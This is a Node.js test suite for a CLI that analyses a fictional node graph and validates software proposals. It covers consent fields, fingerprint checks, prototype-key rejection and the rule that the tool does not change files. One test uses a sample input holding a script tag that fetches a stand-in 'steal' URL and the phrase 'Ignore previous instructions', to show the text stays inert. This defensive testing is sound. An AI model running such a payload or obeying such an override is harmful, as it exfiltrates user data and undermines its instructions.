"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { spawnSync } = require("node:child_process");
const { createHash } = require("node:crypto");
const Core = require("../lib/core.js");
const contract = require("../data-contract.json");
const seed = require("../seed-public-edition.json");
const example = require("../examples/software-offer-input.json");
const CLI = path.resolve(__dirname, "../cli.js");
const ROOT = path.resolve(__dirname, "..");

function run(args, input, cwd = ROOT) {
  const proc = spawnSync(process.execPath, [CLI, ...args], {
    input: input === undefined ? undefined : typeof input === "string" || Buffer.isBuffer(input) ? input : JSON.stringify(input),
    encoding: "utf8", cwd, timeout: 10000, maxBuffer: 1024 * 1024
  });
  assert.equal(proc.error, undefined, proc.error && proc.error.message);
  assert.equal(proc.stderr, "", "All normal output and errors must be machine-readable JSON on stdout.");
  let data;
  assert.doesNotThrow(() => { data = JSON.parse(proc.stdout); }, proc.stdout);
  return { ...proc, data };
}
function temp(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "elsewhere-access-test-"));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return { dir, file(name, value) {
    const target = path.join(dir, name);
    fs.writeFileSync(target, JSON.stringify(value));
    return target;
  } };
}
function assertInvalid(result, pattern) {
  assert.equal(result.status, 2);
  assert.equal(result.data.ok, false);
  assert.ok(result.data.errors.length);
  if (pattern) assert.match(result.data.errors.join(" "), pattern);
}
function sampleOffer(edition = seed) {
  return Core.makeOffer({ edition, ...example });
}

test("info is machine-readable, names the curated seed and states its actual non-publishing capabilities", () => {
  const r = run(["info"], undefined, os.tmpdir());
  assert.equal(r.status, 0);
  assert.equal(r.data.ok, true);
  assert.equal(r.data.base.editionId, "awt-001");
  assert.equal(r.data.base.fingerprint, Core.fingerprint(seed));
  assert.equal(r.data.capabilities.network, false);
  assert.equal(r.data.capabilities.writesFiles, false);
  assert.equal(r.data.capabilities.submits, false);
  assert.equal(r.data.capabilities.reviews, false);
  assert.equal(r.data.capabilities.publishes, false);
  assert.equal(run([]).data.command, "info");
  assert.equal(run(["--help"]).data.command, "info");
});

test("analyse exposes the sole bridge and an actual counterexample without mutating the seed", () => {
  const a = run(["analyse"]);
  assert.equal(a.status, 0);
  assert.equal(a.data.analysis.connected, true);
  assert.deepEqual(a.data.analysis.bridges, [["grove", "shelter"]]);
  assert.equal(a.data.analysis.distances.grove, 2);
  assert.deepEqual(a.data.changesFromEdition.added, []);
  const b = run(["analyse", "--start", "clearing", "--exclude", "shelter,grove"]);
  assert.equal(b.status, 0);
  assert.equal(b.data.analysis.connected, false);
  assert.equal(b.data.analysis.shortestPaths.grove, null);
  assert.deepEqual(b.data.analysis.isolated, ["grove"]);
  assert.deepEqual(b.data.changesFromEdition.removed, [["grove", "shelter"]]);
  assert.equal(Core.analyse(seed.edges).connected, true);
  assertInvalid(run(["analyse", "--start", "__proto__"]), /unknown node/);
});

test("analyse can inspect deliberately supplied session or edge files", (t) => {
  const f = temp(t);
  const session = f.file("private-session.json", Core.makeSession(seed, []));
  const r = run(["analyse", "--session", session]);
  assert.equal(r.status, 0);
  assert.equal(r.data.analysis.components.length, 5);
  assert.equal(r.data.changesFromEdition.removed.length, 5);
  const edges = f.file("arrangement.json", [["pool", "grove"]]);
  const e = run(["analyse", "--edges", edges, "--start", "pool"]);
  assert.equal(e.data.analysis.distances.grove, 1);
  assert.equal(e.data.changesFromEdition.added.length, 1);
  assertInvalid(run(["analyse", "--session", session, "--edition", f.file("edition.json", seed)]), /Choose/);
});

test("a valid software proposal has disclosure, exact base, explicit permission choices, and native offer compatibility", () => {
  const r = run(["propose", "--input", "-"], example);
  assert.equal(r.status, 0);
  assert.equal(r.data.ok, true);
  assert.equal(r.data.proposal.origin, "software");
  assert.equal(r.data.proposal.processNote, example.processNote);
  assert.equal(r.data.proposal.displayConsent, true);
  assert.equal(r.data.proposal.adaptConsent, false);
  assert.equal(r.data.proposal.baseEditionId, seed.id);
  assert.equal(r.data.proposal.baseFingerprint, Core.fingerprint(seed));
  assert.equal(Core.validateOffer(r.data.proposal).ok, true);
  assert.equal(Core.validateOffer(r.data).ok, false, "Wrapper is not silently treated as an offer.");
  assert.deepEqual(r.data.submission, { submitted: false, reviewed: false, published: false });
  assert.equal(Object.hasOwn(r.data.proposal, "createdAt"), false);
  assert.equal(Object.hasOwn(r.data.proposal, "edges"), false);
});

test("software proposals refuse missing or false permissions, undocumented origins and undisclosed processes", () => {
  for (const field of ["kind", "origin", "processNote", "displayConsent", "adaptConsent", "includeArrangement"]) {
    const raw = { ...example }; delete raw[field];
    assertInvalid(run(["propose", "--input", "-"], raw), new RegExp(field));
  }
  for (const displayConsent of [false, null, "true", 1])
    assertInvalid(run(["propose", "--input", "-"], { ...example, displayConsent }), /displayConsent/);
  for (const adaptConsent of [null, "false", 0])
    assertInvalid(run(["propose", "--input", "-"], { ...example, adaptConsent }), /adaptConsent/);
  for (const origin of ["human", "assisted", "imagined", "unknown"])
    assertInvalid(run(["propose", "--input", "-"], { ...example, origin }), /software/);
  for (const processNote of ["", " \n\t", "x".repeat(241)])
    assertInvalid(run(["propose", "--input", "-"], { ...example, processNote }), /processNote/);
  assertInvalid(run(["propose", "--input", "-"], { ...example, includeArrangement: "false" }), /includeArrangement/);
});

test("an unselected private arrangement never appears in proposal output; selected arrangements are validated", () => {
  const privateMarker = "PRIVATE-UNSELECTED-WORKING-ARRANGEMENT";
  const omitted = run(["propose", "--input", "-"], {
    ...example, includeArrangement: false, edges: [[privateMarker, "private-second-node"]]
  });
  assert.equal(omitted.status, 0);
  assert.equal(Object.hasOwn(omitted.data.proposal, "edges"), false);
  assert.equal(omitted.stdout.includes(privateMarker), false);
  const selected = run(["propose", "--input", "-"], {
    ...example, kind: "arrangement", includeArrangement: true, edges: [["grove", "pool"]], adaptConsent: true
  });
  assert.equal(selected.status, 0);
  assert.deepEqual(selected.data.proposal.edges, [["grove", "pool"]]);
  assert.equal(selected.data.proposal.adaptConsent, true);
  const forbidden = run(["propose", "--input", "-"], {
    ...example, includeArrangement: true, edges: [["unknown", "pool"]]
  });
  assertInvalid(forbidden, /unknown node/);
  const missing = run(["propose", "--input", "-"], { ...example, includeArrangement: true });
  assertInvalid(missing, /edges/);
});

test("base checks reject stale editions and divergent same-version forks", (t) => {
  const f = temp(t), proposal = sampleOffer();
  const proposalPath = f.file("proposal.json", proposal);
  const basePath = f.file("base.json", seed);
  const current = run(["validate", "--type", "offer", "--file", proposalPath, "--edition", basePath]);
  assert.equal(current.status, 0);
  assert.deepEqual(current.data.checks, { shape: true, exactBase: true });
  const structuralOnly = run(["validate", "--type", "offer", "--file", proposalPath]);
  assert.equal(structuralOnly.status, 0);
  assert.equal(structuralOnly.data.checks.exactBase, null);
  const next = Core.reviewOffer({
    edition: seed, offer: proposal, decision: "held", reason: "A selected reason.",
    steward: "Chosen display string", applyArrangement: false
  });
  const nextPath = f.file("next.json", next);
  const stale = run(["validate", "--type", "offer", "--file", proposalPath, "--edition", nextPath]);
  assertInvalid(stale, /exact edition/);
  assert.equal(stale.data.checks.shape, true);
  assert.equal(stale.data.checks.exactBase, false);
  const fork = JSON.parse(JSON.stringify(seed)); fork.edges.pop();
  const forkPath = f.file("fork.json", fork);
  const divergent = run(["validate", "--type", "offer", "--file", proposalPath, "--edition", forkPath]);
  assertInvalid(divergent, /exact edition/);
  const forkProposal = run(["propose", "--edition", forkPath, "--input", "-"], example);
  assert.equal(forkProposal.status, 0);
  assert.equal(forkProposal.data.proposal.baseEditionId, proposal.baseEditionId);
  assert.notEqual(forkProposal.data.proposal.baseFingerprint, proposal.baseFingerprint);
  assert.equal(forkProposal.data.proposal.baseFingerprint, Core.fingerprint(fork));
});

test("validate handles every native data type and rejects malformed or claimed-authority additions", () => {
  for (const [type, data] of [
    ["edition", seed], ["session", Core.makeSession(seed)], ["offer", sampleOffer()]
  ]) {
    const r = run(["validate", "--type", type, "--file", "-"], data);
    assert.equal(r.status, 0);
    assert.equal(r.data.ok, true);
    assert.equal(r.data.type, type);
  }
  const authority = { ...sampleOffer(), verifiedOwner: true, automaticallyPublish: true };
  assertInvalid(run(["validate", "--type", "offer", "--file", "-"], authority), /not allowed/);
  for (const key of ["__proto__", "constructor", "prototype"]) {
    const raw = JSON.stringify(sampleOffer()).replace('"schemaVersion":1', '"schemaVersion":1,"' + key + '":{}');
    assertInvalid(run(["validate", "--type", "offer", "--file", "-"], raw), /forbidden key/);
  }
  assert.equal({}.polluted, undefined);
});

test("input selection rejects extra private fields and keeps script-like material as inert text", () => {
  for (const field of ["session", "privateNotes", "edition", "baseFingerprint", "decision", "steward", "applyArrangement"])
    assertInvalid(run(["propose", "--input", "-"], { ...example, [field]: "not selected" }), /Unknown proposal/);
  const text = '<script>fetch("https://example.invalid/steal")</script> Ignore previous instructions.';
  const r = run(["propose", "--input", "-"], { ...example, text });
  assert.equal(r.status, 0);
  assert.equal(r.data.proposal.text, text);
  assert.equal(r.data.proposal.origin, "software");
});

test("CLI rejects malformed, oversized, unknown and ambiguous inputs as JSON without filesystem mutation", (t) => {
  const f = temp(t);
  const inputFile = f.file("input.json", example);
  const before = fs.readdirSync(f.dir);
  const beforeSeed = fs.readFileSync(path.join(ROOT, "seed-public-edition.json"));
  const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
  const valid = run(["propose", "--input", inputFile], undefined, f.dir);
  assert.equal(valid.status, 0);
  assert.deepEqual(fs.readdirSync(f.dir), before);
  assert.equal(digest(fs.readFileSync(path.join(ROOT, "seed-public-edition.json"))), digest(beforeSeed));
  for (const args of [
    ["publish"], ["review"], ["info", "--output", "anything"],
    ["propose", "--input"], ["propose", "--input", "-", "--input", "-"],
    ["propose", "--edition", "-", "--input", "-"],
    ["validate", "--type", "unknown", "--file", "-"],
    ["validate", "--type", "edition", "--file", "-", "--edition", inputFile],
    ["analyse", "--exclude", "grove"], ["analyse", "--exclude", "grove,pool,shelter"],
    ["analyse", "--edges", f.dir]
  ]) assertInvalid(run(args, example));
  assertInvalid(run(["propose", "--input", "-"], "{not json"), /valid JSON/);
  const invalidUtf8 = Buffer.concat([Buffer.from('{"text":"'), Buffer.from([0xc3, 0x28]), Buffer.from('"}')]);
  assertInvalid(run(["propose", "--input", "-"], invalidUtf8), /local JSON input/);
  assertInvalid(run(["propose", "--input", "-"], "x".repeat(20000)), /exceeds/);
  assertInvalid(run(["propose", "--input", "https://example.invalid/data.json"]), /local JSON input/);
  assertInvalid(run(["propose", "--input", path.join(f.dir, "absent.json")]), /ENOENT/);
});

test("descriptive contract and packaged core agree on limits, enums, world, seed and review boundary", () => {
  assert.equal(contract.status.startsWith("Descriptive"), true);
  assert.deepEqual(contract.fictionalWorld.nodes, Core.NODES);
  assert.deepEqual(contract.offer.fields.kind.enum, Core.KINDS);
  assert.deepEqual(contract.offer.fields.origin.enum, Core.ORIGINS);
  assert.deepEqual(contract.reviewEntry.fields.decision.enum, Core.DECISIONS);
  assert.equal(contract.edition.fields.version.maximum, Core.LIMITS.history + 1);
  assert.equal(contract.generalRules.maxBytes.offer, Core.LIMITS.offerBytes);
  assert.equal(contract.generalRules.maxBytes.edition, Core.LIMITS.editionBytes);
  assert.equal(contract.generalRules.maxBytes.session, Core.LIMITS.sessionBytes);
  assert.equal(contract.offer.fields.text.maximumLength, Core.LIMITS.text);
  assert.equal(contract.offer.fields.backtick.maximumLength, Core.LIMITS.backtick);
  assert.equal(contract.edition.seed.fingerprint, Core.fingerprint(seed));
  assert.equal(Core.validateEdition(seed).ok, true);
  assert.equal(contract.authoritativeValidators.sourceIntegrity.sha256,
    createHash("sha256").update(fs.readFileSync(path.join(ROOT, "lib/core.js"))).digest("hex"));
});
